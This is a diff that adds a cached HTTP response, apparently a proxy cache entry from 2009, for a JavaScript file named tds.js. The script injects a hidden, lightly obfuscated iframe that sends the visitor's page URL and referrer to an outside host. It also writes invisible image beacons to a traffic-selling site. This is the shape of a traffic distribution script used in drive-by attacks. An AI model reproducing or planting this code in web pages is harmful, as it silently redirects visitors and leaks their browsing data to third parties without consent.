@@ -1,0 +1,23 @@
+HTTP/1.1 200 OK
+Content-Length: 529
+Date: Mon, 16 Mar 2009 08:19:31 GMT
+Last-Modified: Thu, 12 Mar 2009 10:22:14 GMT
+Server: nginx/0.6.35
+Content-Type: application/x-javascript
+Accept-Ranges: bytes
+X-Polipo-Location: http://uk.myiframe.com:88/tds.js
+X-Polipo-Date: Mon, 16 Mar 2009 08:28:15 GMT
+X-Polipo-Access: Mon, 16 Mar 2009 08:28:15 GMT
+
+var html = '';
+html += '<ifr' + 'ame src="http://uk.myiframe.com/direct.php';
+html += '?url=' + encodeURIComponent(document.location);
+html += '&ref=' + encodeURIComponent(document.referrer);
+html += '&frm=' + self.parent.frames.length;
+html += '&nc=' + Math.random() + '" style="display:none;">';
+html += '</ifr' + 'ame>';
+document.write(html);
+
+//document.write("<img src='http://simple.by/' style='display:none'>");
+document.write("<img src='http://trafficshop.biz/ts/in.cgi?richtraffic' style='display:none'>");
+
